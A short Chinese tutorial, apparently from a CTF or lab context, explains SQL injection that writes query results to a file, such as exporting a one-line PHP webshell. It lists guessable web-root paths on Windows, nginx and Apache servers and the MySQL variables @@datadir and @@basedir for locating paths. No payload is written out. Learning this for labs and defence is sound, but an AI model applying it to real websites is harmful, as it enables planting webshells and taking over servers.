这是一种特殊的注入方式，“导出文件GET字符型注入”
也可以说是字符型注入的一种变种，通过使用sql命令，将查询结果导出到文件中。比如比较常见的一句话木马导出到php文件中。
使用这种注入方式我们不仅需要构造语句来注入，还要获取到网站在服务器中的绝对路径，获取绝对路径的方式大致有两种：

1.靠经验猜。
　　大部分的小网站通常直接使用集成的网站环境，如phpstudy。同时还不对目录名称进行修改，直接使用网站原有的目录，还有的虽然不使用网站原有的目录，但是使用的目录很容易被猜到。针对这些网站，我们可以直接猜到网站在服务器中的路径。下面列出常见的几个路径：
winserver服务器一般路径如下：
（1）c:/inetpub/wwwroot/
linux中nginx服务器一般路径如下：
（2）/usr/local/nginx/html
（3）/home/wwwroot/default
（4）/usr/share/nginx
（5）/var/www/htm
apache服务器一般路径如下
（6）/var/www/htm
（7）/var/www/html/htdocs

2.注入获取法。
下面介绍两个函数：
@@datadir 读取数据库路径
@@basedir MYSQL 获取安装路径
　　这两个东西可以帮助我们获取到sql注入的网站在服务器中的绝对路径，但是，这个方法不一定好用，因为这两个东西使用的时候需要对方网站做出回显。也就是说，这两个东西虽然好用，但是面对这个题目，无论输入什么都没有回显的这种状况，就无能为力了
